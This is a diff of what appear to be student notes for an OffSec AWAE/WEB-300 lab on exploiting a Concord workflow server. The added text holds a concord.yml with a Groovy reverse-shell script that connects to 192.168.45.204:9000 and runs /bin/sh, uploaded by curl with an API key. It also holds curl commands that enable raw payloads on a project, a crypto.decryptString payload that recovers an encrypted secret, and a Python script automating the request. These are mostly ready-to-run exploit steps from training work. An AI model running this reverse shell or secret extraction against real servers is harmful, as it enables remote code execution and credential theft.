@@ -1046,61 +1046,120 @@ Soln for Obtain RCE with a curl request using the newly-discovered API key:
 ```
 curl -F concord.yml=@concord.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"
 ```
-
-Decrypt encrypted string - Not sure abt the soln:
-
-Need  to create org and project. The login using apikey, the users are not authed to create org.
+concord.yml
+```
+configuration:
+  dependencies:
+  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
+flows:
+  default:
+    - script: groovy
+      body: |
+         String host = "192.168.45.204";
+         int port = 9000;
+         String cmd = "/bin/sh";
+         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+         Socket s = new Socket(host, port);
+         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+         while (!s.isClosed()) {
+         while (pi.available() > 0) so.write(pi.read());
+         while (pe.available() > 0) so.write(pe.read());
+         while (si.available() > 0) po.write(si.read());
+         so.flush();
+         po.flush();
+         Thread.sleep(50);
+         try {
+            p.exitValue();
+            break;
+         } catch (Exception e) {}
+         };
+         p.destroy();
+         s.close();
 
 ```
-curl -vv -X POST -H "Authorization: O+JMYwBsU797EKtlRQYu+Q" -H 'Content-Type: application/json' --data '{"name":"AWAE", "description": "AWAE project", "rawPayloadMode":"EVERYONE"}' http://concord:8001/api/v1/org/OffSec/project
 
-Thank you i found out that te yaml format is very sensitive for this taks now i am trying to execute the funtcion, i get that i have to enable raw payload but still i cant get the yaml to recognize my project argument its driving me crazy the error is always : c.w.concord.client.ClientUtils - call error: 'Bad Request: Project is required' 
+```
+https://github.com/walmartlabs/concord-website/blob/master/docs/api/process.md
+
+```
+```
+try with
+
+flows:
+    default:
+    - log: "${text}"
+ 
+configuration:
+    arguments:
+      text: ${crypto.decryptString("vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf")}
+
+and
+
+curl -F project=AWAE -F org=OffSec -F concord.yml=@decrypt.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"
+
+```
+That curl command will create org and project.
+
+Then need to run following to update project to accept raw payload.
+
+```
+curl -vv -X POST -H "Authorization: auBy4eDWrKWsyhiDp3AQiw" -H 'Content-Type: application/json' --data '{"name":"AWAE", "description": "AWAE project", "rawPayloadMode":"EVERYONE"}' http://concord:8001/api/v1/org/OffSec/project
+```
+
+Then run this curl command and check log from UI:
+```
+curl -F project=AWAE -F org=OffSec -F concord.yml=@decrypt.yml http://concord:8001/api/v1/process -vv -H "Authorization: O+JMYwBsU797EKtlRQYu+Q"
+```
+
+Log:
+```
+12:37:47 [INFO ] Using entry point: default
+12:37:47 [INFO ] Enqueued. Waiting for an agent (requirements=null)...
+12:37:49 [INFO ] Acquired by: Concord-Agent: id=df49f73a-cb34-11ee-8211-0242ac120003
+12:37:49 [INFO ] Downloading the process state...
+12:37:49 [INFO ] Process state download took 97ms
+12:37:49 [INFO ] Runtime: concord-v1
+12:37:49 [INFO ] Resolving process dependencies...
+12:37:51 [INFO ] Dependencies: 
+	mvn://com.walmartlabs.concord.plugins.basic:concord-tasks:1.43.0
+	mvn://com.walmartlabs.concord.plugins.basic:slack-tasks:1.43.0
+	mvn://com.walmartlabs.concord.plugins.basic:http-tasks:1.43.0
+12:37:59 [INFO ] Process status: RUNNING
+12:38:00 [INFO ] c.w.concord.plugins.log.LoggingTask - Džemujem ja stalno ali nemam džema
+12:38:01 [INFO ] Process finished with: 0
+12:38:01 [INFO ] Process status: FINISHED
 ```
 
 
-. I'm uploading zip file with concord.yml, can call crypto.decrypt expression, but it throws "Project is required" error. It seems I need to pass in some variables, but I get syntax errors. How can I resolve it?
-Update
-I added project form parameter but this time getting "Organization ID or name is required"
 
-a certain option has to be enabled for this to work. Google search error messages and find how to do so.
 
-check db/src/main/resources/com/walmartlabs/concord/server/db/v1.28.0.xml - for raw_payload_mode.
-Version of the file may be different.
 
-people tried this... didn't work:
+Once project, org is present and rawpayloadmode is enabled, then following will work.
+                  
+┌──(kali㉿kali)-[~/web-300/concord]
+└─$ cat test.py  
+import requests
 
-```
 def decrypt_content(target, port, api_key):
     # http://concord:8001/api/v1/process
     yaml_payload = """
 flows:
   default:
   - log: "Hello, ${name}"
+
 configuration:
   arguments:
-    name: ${crypto.decryptString("4d1+ruCra6CLBboT7Wx5mw==")}"""
+    name: ${crypto.decryptString("vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf")}"""
     # ${{crypto.decryptString('vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf')}}
+    # ${crypto.decryptString("4d1+ruCra6CLBboT7Wx5mw==")}
+
     r = requests.post(f"http://{target}:{port}/api/v1/process",
                       headers={"Authorization": api_key},
-                      data={"project": "AWAE", "org": "OffSec"},
+                      #data={"project": "AWAE", "org": "OffSec"},
                       files={'concord.yml': ("blob", yaml_payload, "application/yml")},
                       proxies={"http": "http://127.0.0.1:8080"})
     print(r.json())
-```
 
-and
-
-```
-    yaml_payload = """
-flows:
-  default:
-  - task: concord
-    in:
-      action: start
-      project: AWAE
-      org: OffSec
-  - log: 'Done! ${crypto.decryptString('vyblrnt+hP8GNVOfSl9WXgGcQZceBhOmcyhQ0alyX6Rs5ozQbEvChU9K7FWSe7cf')} is completed'
-"""
-
-```
-didn't work ^
+decrypt_content("concord", 8001, "Gz0q/DeGlH8Zs7QJMj1v8g")
+                                                                                                                       
